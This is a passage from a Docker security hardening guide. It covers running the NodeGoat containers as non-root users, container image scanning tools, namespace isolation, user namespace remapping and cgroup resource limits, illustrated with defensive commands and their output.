    60 -rw-r-----    1 nodegoat_docker nodegoat_docker  11K Nov 21  2015 LICENSE
    68 -rw-r-----    1 nodegoat_docker nodegoat_docker   48 Nov 21  2015 Procfile
    64 -rw-r-----    1 nodegoat_docker nodegoat_docker 5.6K Sep 12 04:22 README.md
    56 drwxr-x---   14 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 app
    66 -rw-r-----    1 nodegoat_docker nodegoat_docker  527 Nov 15  2015 app.json
    54 drwxr-x---    5 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 artifacts
    62 drwxr-x---    5 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 config
    57 -rw-r-----    1 nodegoat_docker nodegoat_docker  244 Sep 13 04:51 docker-compose.yml
    67 drwxr-x--- 1428 nodegoat_docker nodegoat_docker  20K Sep 13 08:51 node_modules
    63 -rw-r-----    1 nodegoat_docker nodegoat_docker 1.4K Sep 12 04:22 package.json
    52 -rw-r-----    1 nodegoat_docker nodegoat_docker 4.6K Sep 12 04:01 server.js
    59 drwxr-x---    8 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 test
     ---> b88d816315b1
    Removing intermediate container 8662e1657d0f
    Step 16 : RUN ls ../ -liah
     ---> Running in 0ee2dcc889a6
    total 12K
    12 drwxr-xr-x  9 root            root            4.0K Sep 13 08:51 .
    11 drwxr-xr-x 34 root            root            4.0K Sep 13 08:51 ..
    13 drwxr-x--- 21 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 app

An alternative to setting the non-root user in the `Dockerfile` is to set it in the `docker-compose.yml`, provided that the non-root user has been added to the image in the `Dockerfile`. In the case of NodeGoat, the mongo `Dockerfile` is maintained by DockerHub, and it adds a user called `mongodb`. In the NodeGoat projects `docker-compose.yml`, we just need to set the user, as seen on line 13 below:

{id="nodegoat-docker-compose.yml", title="NodeGoat docker-compose.yml", linenos=on}
    version: "2.0"
    
    services:
      web:
        build: .
        command: bash -c "node artifacts/db-reset.js && npm start"
        ports:
          - "4000:4000"
        links:
          - mongo
      mongo:
        image: mongo:latest
        user: mongodb
        expose:
          - "27017"

Alternatively, a container may be run as a non-root user by  
`docker run -it --user lowprivuser myimage`  
but this is not ideal, the specific user should usually be part of the build.

#### Hardening Docker Host, Engine and Containers {#vps-countermeasures-docker-hardening-docker-host-engine-and-containers}
![](images/ThreatTags/PreventionDIFFICULT.png)

Make sure you keep your host kernel well patched, as it is a huge attack surface, with all of your containers accessing it via System calls.

The space for tooling to help find vulnerabilities in code, packages, etc within your Docker images has been noted, and [tools provided](https://community.alfresco.com/community/ecm/blog/2015/12/03/docker-security-tools-audit-and-vulnerability-assessment/). The following is a sorted list of what feels like does the least and is the simplest in terms of security/hardening features to what does the most, not understating tools that do a little, but do it well.

These tools should form a part of your secure and trusted build pipeline, or [software supply-chain](https://blog.acolyer.org/2017/04/03/a-study-of-security-vulnerabilities-on-docker-hub/).

##### [Haskell Dockerfile Linter](https://github.com/lukasmartinelli/hadolint)

"_A smarter Dockerfile linter that helps you build_ [_best practice Docker images_](https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/)."

##### [Lynis](https://cisofy.com/downloads/)

Lynis is a mature, free and [open source](https://github.com/CISOfy/lynis) auditing tool for Linux/Unix based systems. There is a [Docker plugin](https://cisofy.com/lynis/plugins/docker-containers/) available which allows one to audit Docker, its configuration and containers, but an enterprise license is required, although it is inexpensive.

##### [Docker Bench](https://github.com/docker/docker-bench-security)

Docker Bench is a shell script that can be downloaded from GitHub and executed immediately, run from a pre-built container, or using Docker Compose after Git cloning. Docker Bench tests many host configurations and Docker containers against the CIS Docker Benchmark.

##### CoreOS [Clair](https://github.com/coreos/clair)

CoreOS is an open source project that appears to do a similar job to Docker Security Scanning, but it is free. You can use it on any image you pull, to compare the hashes of the packages from every container layer within, with hashes of the [CVE data sources](https://github.com/coreos/clair/tree/f66103c7732c9a62ba1d3afc26437ae54953dc01#default-data-sources). You could also use Clair on your CI/CD build to stop images being deployed if they have packages with hashes that match those of the CVE data sources. quay.io was the first container registry to integrate with Clair.

##### Banyanops [collector](https://github.com/banyanops/collector)

Banyanops is a free and open source framework for static analysis of Docker images. It does more than Clair, it can optionally communicate with Docker registries, private or Docker Hub, to obtain image hashes, and it can then tell Docker Daemon to pull the images locally. Collector then `docker run`'s each container in turn to be inspected. Each container runs a banyan or user-specified script which outputs the results to stdout. Collector collates the containers output, and can send this to Banyan Analyser for further analysis. Collector has a [pluggable, extensible architecture](https://github.com/banyanops/collector/blob/master/docs/CollectorDetails.md). Collector can also: enforce policies, such as no unauthorised user accounts, etc. Make sure components are in their correct location. Banyanops was the organisation that [blogged](https://www.banyanops.com/blog/analyzing-docker-hub/) about the high number of vulnerable packages on Docker Hub. They have really put their money where their mouth was now.

##### [Anchore](https://anchore.com/solutions/)

Anchore is a set of tools that provide visibility, control, analytics, compliance and governance for containers in the cloud or on-prem for a fee.  
There are two main parts, a hosted web service, and a set of open source CLI query tools.  
The hosted service selects and analyses popular container images from Docker Hub and other registries. The metadata it creates is provided as a service to the on-premise CLI tools.  
It performs a similar job to that of Clair, but does not look as simple. It also looks for source code secrets, API keys, passwords, etc. in images.

It's designed to integrate into your CI/CD pipeline and integrates with Kubernetes, Docker, Jenkins, CoreOS, Mesos

##### [TwistLock](https://www.twistlock.com/) {#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-twistlock}

TwistLock is a fairly comprehensive and complete proprietary offering with a free developer edition. The following details were taken from TwistLock marketing pages:

Features of Trust:

* Discover and manage vulnerabilities in images
* Uses CVE data sources similar to CoreOS Clair
* Can scan registries: Docker Hub, Google Container Registry, EC2 Container Registry, Artifactory, Nexus Registry, and images for vulnerabilities in code and configuration
* Enforce and verify standard configurations
* Hardening checks on images based on CIS Docker benchmark
* Real-time vulnerability and threat intelligence
* Provide out-of-box plugins for vulnerability reporting directly into Jenkins and TeamCity
* Provides a set of APIs for developers to access almost all of the TwistLock core functions

Features of Runtime:

* Policy enforcement
* Detect anomalies, uses open source CVE feeds, commercial threat and vulnerability sources, as well as TwistLock's own Lab research
* Defend and adapt against active threats and compromises using machine learning
* Governs access control to individual APIs of Docker Engine, Kubernetes, and Docker Swarm, providing LDAP/AD integration.

##### Possible contenders to watch

* [Drydock](https://github.com/zuBux/drydock) is a similar offering to Docker Bench, but not as mature at this stage
* [Actuary](https://github.com/diogomonica/actuary) is a similar offering to Docker Bench, but not as mature at this stage. I [discussed](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) this project briefly with its creator Diogo Mónica, and it sounds like the focus is on creating a better way of running privileged services on swarm, instead of investing time into this.

##### Namespaces {#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-namespaces}

1. `mnt`: Keep the default propagation mode of `private` unless you have a very good reason to change it. If you do need to change it, think about defence in depth and employ other defence strategies.  
    
    If you have control over the Docker host, lock down the mounting of the host systems partitions as discussed in the [Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions) section.
    
    If you have to mount a sensitive host system directory, mount it as read-only:
    
    {linenos=off, lang=bash}
        docker run -it --rm -v /etc:/hosts-etc:ro --name=lets-mount-etc ubuntu
    
    If any file modifications are now attempted on `/etc` they will be unsuccessful.
    
    {title="Query", linenos=off, lang=bash}
        docker inspect -f "{{ json .Mounts }}" lets-mount-etc
    
    {title="Result", linenos=off, lang=bash}
        [
          {
            "Type":"volume",
            "Source":"/etc",
            "Destination":"/hosts-etc",
            "Mode":"ro",
            "RW":false,
            "Propagation":""
          }
        ]
    
    Also, as discussed previously, lock down the user to non-root.
    
    If you are using LSM, you will probably want to use the `Z` option as discussed in the risks section.  
    
2. `PID`: By default enforces isolation from the containers `PID` namespace, but not from the host to the container. If you are concerned about host systems being able to access your containers, as you should be, consider putting your containers within a VM  
    
3. `net`: A network namespace is a virtualisation of the network stack, with its own network devices, IP routing tables, firewall rules and ports.  
When a network namespace is created the only network interface that is created is the loopback interface, which is down until brought up.  
Each network interface, whether physical or virtual, can only reside in one namespace, but can be moved between namespaces.  
    
    When the last process in a network namespace terminates, the namespace will be destroyed, destroy any virtual interfaces within it, and move any physical network devices back to the initial network namespace, not the process parent.

    **Docker and Network Namespaces**
    
    A Docker network is analogous to a Linux kernel network namespace.
    
    When Docker is installed, three networks are created `bridge`, `host` and `none`, which you can think of as network namespaces. These can be seen by running: [`docker network ls`](https://docs.docker.com/engine/reference/commandline/network_ls/)
    
    {linenos=off, lang=bash}
        NETWORK ID    NAME              DRIVER   SCOPE
        9897a3063354  bridge            bridge   local
        fe179428ccd4  host              host     local
        a81e8669bda7  none              null     local
    
    When you run a container, if you want to override the default network of `bridge`, you can specify which network you want to run the container with the `--network` flag as the following:  
    `docker run --network=<network>`
    
    The bridge can be seen by running `ifconfig` on the host:
    
    {linenos=off, lang=bash}
        docker0   Link encap:Ethernet  HWaddr 05:22:bb:08:41:b7  
                  inet addr:172.17.0.1  Bcast:0.0.0.0  Mask:255.255.0.0
                  inet6 addr: fe80::42:fbff:fe80:57a5/64 Scope:Link
    
    When the Docker engine (CLI) client or API tells the Docker daemon to run a container, part of the process allocates a bridged interface, unless specified otherwise, that allows processes within the container to communicate to the system host via the virtual Ethernet bridge.
    
    When Virtual Ethernet interfaces are created, they are always created as a pair. You can think of them as one interface on each side of a namespace wall with a tube through the wall connecting them. Packets come in one interface and exit the other, and vice versa.
    
    **Creating and Listing Network NameSpaces**
    
    Some of these commands you will need to run as root.
    
    Create:
    
    {title="Syntax", linenos=off, lang=bash}
        ip netns add <yournamespacename>
    
    {title="Example", linenos=off, lang=bash}
        ip netns add testnamespace
    
    This ip command adds a bind mount point for the `testnamespace` namespace to `/var/run/netns/`. When the `testnamespace` namespace is created, the resulting file descriptor keeps the network namespace alive and persisted. This allows system administrators to apply configuration to the network namespace without fear that it will disappear when no processes are within it.
    
    {title="Verify it was added", linenos=off, lang=bash}
        ip netns list
    
    {title="Result", linenos=off, lang=bash}
        testnamespace
    
    However, a network namespace added in this way cannot be used for a Docker container. In order to create a [Docker network](https://docs.docker.com/engine/userguide/networking/) called `kimsdockernet` run the following command:
    
    {linenos=off, lang=bash}
        # bridge is the default driver, so not required to be specified
        docker network create --driver bridge kimsdockernet
    
    You can then follow this with a  
    `docker network ls`  
    to confirm that the network was added. You can base your network on one of the existing [network drivers](https://docs.docker.com/engine/reference/run/#network-settings) created by Docker, the bridge driver is used by default.
    
    [`bridge`](https://docs.docker.com/engine/reference/run/#network-bridge): As seen above with the `ifconfig` listing on the host system, an interface is created called docker0 when Docker is installed. A pair of veth (Virtual Ethernet) interfaces are also created when the container is run with this `--network` option. The `veth` on the outside of the container will be attached to the bridge, the other `veth` is put inside the container's namespace, along with the existing loopback interface.  
    [`none`](https://docs.docker.com/engine/reference/run/#network-none): There will be no networking in the container other than the loopback interface which was created when the network namespace was created, and it has no routes to external traffic.  
    [`host`](https://docs.docker.com/engine/reference/run/#network-host): Uses the network stack that the host system uses inside the container. The `host` mode is more performant than the `bridge` mode due to using the hosts native network stack, but is also less secure.  
    [`container`](https://docs.docker.com/engine/reference/run/#network-container): Allows you to specify another container to use its network stack.
    
    When running  
    `docker network inspect kimsdockernet`  
    before starting the container, and then again after, you will see the new container added to the `kimsdockernet` network.
    
    Now you can run your container using your new network:
    
    {linenos=off, lang=bash}
        docker run -it --network kimsdockernet --rm --name=container0 ubuntu
    
    When one or more processes (in this case Docker containers) use the `kimsdockernet` network, it can also be seen opened by the presence of its file descriptor at:
    
    `/var/run/docker/netns/<filedescriptor>`
    
    You can also see that the container named `container0` has a network namespace by running the following command, which shows the file handles for the namespaces, and not just the network namespace:
    
    {title="Query Namespaces", linenos=off, lang=bash}
        sudo ls /proc/`docker inspect -f '{{ .State.Pid }}' container0`/ns -liah
    
    {title="Result", linenos=off, lang=bash}
        total 0
        1589018 dr-x--x--x 2 root root 0 Mar 14 16:35 .
        1587630 dr-xr-xr-x 9 root root 0 Mar 14 16:35 ..
        1722671 lrwxrwxrwx 1 root root 0 Mar 14 17:33 cgroup -> cgroup:[4026531835]
        1722667 lrwxrwxrwx 1 root root 0 Mar 14 17:33 ipc -> ipc:[4026532634]
        1722670 lrwxrwxrwx 1 root root 0 Mar 14 17:33 mnt -> mnt:[4026532632]
        1589019 lrwxrwxrwx 1 root root 0 Mar 14 16:35 net -> net:[4026532637]
        1722668 lrwxrwxrwx 1 root root 0 Mar 14 17:33 pid -> pid:[4026532635]
        1722669 lrwxrwxrwx 1 root root 0 Mar 14 17:33 user -> user:[4026531837]
        1722666 lrwxrwxrwx 1 root root 0 Mar 14 17:33 uts -> uts:[4026532633]
    
    If you run  
    `ip netns list`  
    again, you may think you should be able to see the Docker network, but you won't, unless you create the following symlink:
    
    {linenos=off, lang=bash}
        ln -s /proc/`docker inspect -f '{{.State.Pid}}' container0`/ns/net /var/run/netns/container0
        # Don't forget to remove the symlink once the container terminates,
        # else it will be dangling.
    
    If you want to run a command inside of the Docker network of a container, you can use the [`nsenter`](http://man7.org/linux/man-pages/man1/nsenter.1.html) command of the `util-linux` package:
    
    {linenos=off, lang=bash}
        # Show the ethernet state:
        nsenter -t `docker inspect -f '{{ .State.Pid }}' container0` -n ifconfig
        # Or
        nsenter -t `docker inspect -f '{{ .State.Pid }}' container0` -n ip addr show
        # Or
        nsenter --net=/var/run/docker/netns/<filedescriptor> ifconfig
        # Or
        nsenter --net=/var/run/docker/netns/<filedescriptor> ip addr show
    
    **Deleting Network NameSpaces**
    
    The following command will remove the bind mount for the specified namespace. The namespace will continue to persist until all processes within it are terminated, at which point any virtual interfaces within it will be destroyed and any physical network devices if they were assigned, would be moved back to the initial network namespace, not the process parent.
    
    {title="Syntax", linenos=off, lang=bash}
        ip netns delete <yournamespacename>
    
    {title="Example", linenos=off, lang=bash}
        ip netns delete testnamespace  
    
    {title="To remove a docker network", linenos=off, lang=bash}
        docker network rm kimsdockernet
    
    If you still have a container running, you will receive an error:  
    `Error response from daemon: network kimsdockernet has active endpoints`  
    Stop your container and try again.
    
    It also pays to [understand container communication](https://docs.docker.com/v17.09/engine/userguide/networking/default_network/container-communication/) with each other.
    
    Also checkout the [Additional Resources](#additional-resources-vps-countermeasures-docker-hardening-docker-host-engine-and-containers-namespaces).  
    
4. `UTS` Do not start your containers with the `--uts` flag set to `host`  
As mentioned in the CIS\_Docker\_1.13.0\_Benchmark "_Sharing the UTS namespace with the host provides full permission to the container to change the hostname of the host. This is insecure and should not be allowed._". You can test that the container is not sharing the host's UTS namespace by making sure the following command returns nothing, instead of `host`:
    
    {linenos=off, lang=bash}
        docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: UTSMode={{ .HostConfig.UTSMode }}'
    
5. `IPC`: In order to stop another untrusted container sharing your containers IPC namespace, you could isolate all of your trusted containers in a VM, or if you are using some type of orchestration, that will usually have functionality to isolate groups of containers. If you can isolate your trusted containers sufficiently, then you may still be able to share the IPC namespace of other near by containers.
    
6. `user`: If you have read the [risks section](#vps-identify-risks-docker-docker-host-engine-and-containers-namespaces) and still want to enable support for user namespaces, you first need to confirm that the host user of the associated containers `PID` is not root by running the following CIS Docker Benchmark recommended commands:
    
    {linenos=off, lang=Bash}
        ps -p $(docker inspect --format='{{ .State.Pid }}' <CONTAINER ID>) -o pid,user
    
    Or, you can run the following command and make sure that the `userns` is listed under the `SecurityOptions`
    
    {linenos=off, lang=Bash}
        docker info --format '{{ .SecurityOptions }}'
    
    Once you have confirmed that your containers are not being run as root, you can look at enabling user namespace support on the Docker daemon.
    
    The `/etc/subuid` and `/etc/subgid` host files will be read for the user and optional group supplied to the `--userns-remap` option of `dockerd`.
    
    The `--userns-remap` option accepts the following value types:
    
    * `uid`
    * `uid:gid`
    * `username`
    * `username:groupname`  
    
    The username must exist in the `/etc/passwd` file, the `sbin/nologin` users are [also valid](https://success.docker.com/KBase/Introduction_to_User_Namespaces_in_Docker_Engine). Subordinate user Id and group Id ranges need to be specified in `/etc/subuid` and `/etc/subuid` respectively.
    
    "_The UID/GID we want to remap to [does not need to match](https://success.docker.com/KBase/Introduction_to_User_Namespaces_in_Docker_Engine) the UID/GID of the username in `/etc/passwd`_". It is the entity in the `/etc/subuid` that will be the owner of the Docker daemon and the containers it runs. The value you supply to `--userns-remap` if numeric Ids, will be translated back to the valid user or group names of `/etc/passwd` and `/etc/group` which must exist, if username, groupname, they must match the entities in `/etc/passwd`, `/etc/subuid`, and `/etc/subgid`.
    
    Alternatively, if you do not want to specify your own user and/or user:group, you can provide the `default` value to `--userns-remap`, and a default user of `dockremap` along with subordinate uid and gid ranges that will be created in `/etc/passwd` and `/etc/group` if it does not already exist. Then the `/etc/subuid` and `/etc/subgid` files will be [populated](https://docs.docker.com/engine/security/userns-remap/) with a contiguous 65536 length range of subordinate user and group Ids respectively, starting at the offset of the existing entries in those files.
    
    {linenos=off, lang=Bash}
        # As root, run:
        dockerd --userns-remap=default
    
    If `dockremap` does not already exist, it will be created:
    
    {title="/etc/subuid and /etc/subgid", linenos=off, lang=Bash}
        <existinguser>:100000:65536
        dockremap:165536:65536
    
    There are rules about providing multiple range segments in the `/etc/subuid`, `/etc/subgid` files, but that is beyond the scope of what I am providing here. For those advanced scenario details, check out the [Docker engine reference](https://github.com/jquast/docker/blob/2fd674a00f98469caa1ceb572e5ae92a68b52f44/docs/reference/commandline/dockerd.md#detailed-information-on-subuidsubgid-ranges). The simplest scenario is to use a single contiguous range as seen in the above example, this will cause Docker to map the hosts user and group Ids to the container process using as much of the `165536:65536` range as necessary. For example, the host's root user would be mapped to `165536`, the next host user would be mapped to container user `165537`, and so on until the 65536 possible Ids are all mapped. Processes run as root inside the container are owned by the subordinate uid outside of the container.
    
    **Disabling user namespace for specific containers**
    
    In order to disable user namespace mapping, on a per container basis, once enabled for the Docker daemon, you could supply the `--userns=host` value to either of the `run`, `exec` or `create` Docker commands. This would mean the default user within the container was mapped to the host's root.

##### [Control Groups](http://man7.org/linux/man-pages/man7/cgroups.7.html) {#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-control-groups}

Use cgroups to limit, track and monitor the resources available to each container at each nested level. Docker makes applying resource constraints very easy. Check the [runtime constraints on resources](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources) Docker engine run reference documentation, which covers applying constraints such as:

* User memory
* Kernel memory
* Swappiness
* CPU share
* CPU period
* Cpuset
* CPU quota
* Block IO bandwidth (Blkio)

For additional details on setting these types of resource limits, also refer to the [Limit a container's resources](https://docs.docker.com/engine/admin/resource_constraints/) Admin Guide for Docker Engine. Basically, when you `run` a container, you simply provide any number of the runtime configuration flags that control the underlying cgroup system resources. Cgroup resources cannot be set if a process is not running, that is why we optionally pass the flag(s) at runtime or alternatively, manually change the cgroup settings once a process (or Docker container in our case) is running. We can make manual changes on the fly by directly modifying the cgroup resource files. These files are stored in the container's cgroup directories shown in the output of the [`/sys/fs/cgroup   find -name "4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24"`](#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-control-groups-sys-fs-cgroup) command below. These files are ephemeral for the life of the process (Docker container in our case).

By [default](https://docs.docker.com/engine/reference/commandline/dockerd/#options-for-the-runtime) Docker uses the cgroupfs cgroup driver to interface with the Linux kernel's cgroups. You can see this by running `docker info`. The Linux kernel's cgroup interface is provided through the cgroupfs pseudo-filesystem `/sys/fs/cgroup` on the host filesystem of recent Linux distributions. The `/proc/cgroups` file contains the information about the systems controllers compiled into the kernel. This file on my test system looks like the following:

{linenos=off, lang=bash}
    #subsys_name    hierarchy       num_cgroups     enabled
    cpuset          4               9               1
    cpu             5               106             1
    cpuacct         5               106             1
    blkio           11              105             1
    memory          6               170             1
    devices         8               105             1
    freezer         3               9               1
    net_cls         7               9               1
    perf_event      2               9               1
    net_prio        7               9               1
    hugetlb         9               9               1
    pids            10              110             1

The fields represent the following:

* `subsys_name`: The name of the controller
* `hierarchy`: Unique Id of the cgroup hierarchy
* `num_cgroups`: The number of cgroups in the specific hierarchy using this controller
* `enabled`: 1 == enabled, 0 == disabled 

If you run a container as follows:

{linenos=off, lang=bash}
    docker run -it --rm --name=cgroup-test ubuntu
    root@4f1f200ce13f:/# 

Cgroups for your containers and the system resources controlled by them will be stored as follows:

{id="vps-countermeasures-docker-hardening-docker-host-engine-and-containers-control-groups-sys-fs-cgroup", title="/sys/fs/cgroup pseudo-filesystem", linenos=off, lang=bash}
    /sys/fs/cgroup   find -name "4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24"
    ./blkio/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
    ./pids/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
    ./hugetlb/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
    ./devices/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
    ./net_cls,net_prio/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
    ./memory/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
    ./cpu,cpuacct/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
    ./cpuset/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
    ./freezer/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
    ./perf_event/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24
    ./systemd/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/sys/fs/cgroup` pseudo-filesystem

Docker also keeps track of the cgroups in  
`/sys/fs/cgroup/[resource]/docker/[containerId]`  
You will notice that Docker creates cgroups using the container Id.

If you want to manually create a cgroup, and have your containers hierarchically nested within it, you just need to `mkdir` within:  
`/sys/fs/cgroup/`  
You will likely need to be root for this.

{linenos=off, lang=bash}
    /sys/fs/cgroup mkdir cg1

This makes and populates the directory, and also sets up the cgroup like the following:

{linenos=off, lang=bash}
    /sys/fs/cgroup   find -name "cg1"
    ./cg1
    ./blkio/system.slice/docker.service/cg1
    ./pids/system.slice/docker.service/cg1
    ./hugetlb/cg1
    ./devices/system.slice/docker.service/cg1
    ./net_cls,net_prio/cg1
    ./memory/system.slice/docker.service/cg1
    ./cpu,cpuacct/system.slice/docker.service/cg1
    ./cpuset/cg1
    ./freezer/
    ./perf_event/cg1
    ./systemd/system.slice/docker.service/cg1

Now you can run a container with `cg1` as your cgroup parent:

{linenos=off, lang=bash}
    docker run -it --rm --cgroup-parent=cg1 --name=cgroup-test1 ubuntu
    root@810095d51702:/#

Now that Docker has your container named `cgroup-test1` running, you will be able to see the nested cgroups:

{linenos=off, lang=bash}
    /sys/fs/cgroup   find -name "810095d51702*"
    ./blkio/system.slice/docker.service/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903
    ./pids/system.slice/docker.service/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903
    ./hugetlb/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903
    ./devices/system.slice/docker.service/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903
    ./net_cls,net_prio/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903
    ./memory/system.slice/docker.service/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903
    ./cpu,cpuacct/system.slice/docker.service/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903
    ./cpuset/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903
    ./freezer/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903
    ./perf_event/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903
    ./systemd/system.slice/docker.service/cg1/810095d517027737a0ba4619e108903c5cc74517907b883306b90961ee528903

You can also run containers nested below already running containers cgroups, let's take the container named `cgroup-test` for example:

{linenos=off, lang=bash}
    /sys/fs/cgroup/cpu/docker/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24

{linenos=off, lang=bash}
    docker run -it --rm --cgroup-parent=4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24 --name=cgroup-test2 ubuntu
    root@93cb84d30291:/#

Now your new container named `cgroup-test2` will have a set of nested cgroups within each of the:  
`93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270`  
directories shown here:

{linenos=off, lang=bash}
    /sys/fs/cgroup   find -name "93cb84d30291*"
    ./blkio/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    ./pids/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    ./hugetlb/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    ./devices/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    ./net_cls,net_prio/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    ./memory/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    ./cpu,cpuacct/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    ./cpuset/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    ./freezer/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    ./perf_event/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    ./systemd/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270

You should see the same result if you have a look in the running container's  
`/proc/self/cgroup` file.

Within each cgroup resides a collection of files specific to the controlled resource, some of which are used to limit aspects of the resource, and some which are used for monitoring aspects of the resource. They should be fairly obvious what they are based on their names. You can not exceed the resource limits of the cgroup that your cgroup is nested within. There are ways in which you can get visibility into any containers resource usage. One quick and simple way is with the:  
[`docker stats`](https://docs.docker.com/engine/reference/commandline/stats/)` [containerId]`  
command, which will give you a line with your containers CPU usage, Memory usage and Limit, Net I/O, Block I/O, Number of PIDs. There are so many other sources of container resource usage. Check the [Docker engine runtime metrics](https://docs.docker.com/engine/admin/runmetrics/) documentation for additional details.

The most granular information can be found in the statistical files within the cgroup directories listed above.  
The `/proc/[pid]/cgroup` file provides a description of the cgroups that the process with the specified PID belongs too. You can see this in the following `cat` output. The information provided is different for cgroups version 1 and version 2 hierarchies, for this example, we are focussing on version 1. Docker abstracts all of this anyway, so it is just to show you how things hang together:

{linenos=off, lang=bash}
    cat /proc/`docker inspect -f '{{ .State.Pid }}' cgroup-test2`/cgroup
    11:blkio:/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    10:pids:/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    9:hugetlb:/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    8:devices:/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    7:net_cls,net_prio:/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    6:memory:/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    5:cpu,cpuacct:/system.slice/docker.service/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
    4:cpuset:/4f1f200ce13f2a7a180730f964c6c56d25218d6dd40b027c7b5ee1e551f4eb24/93cb84d30291201a84d5676545015220696dbcc72a65a12a0c96cda01dd1d270
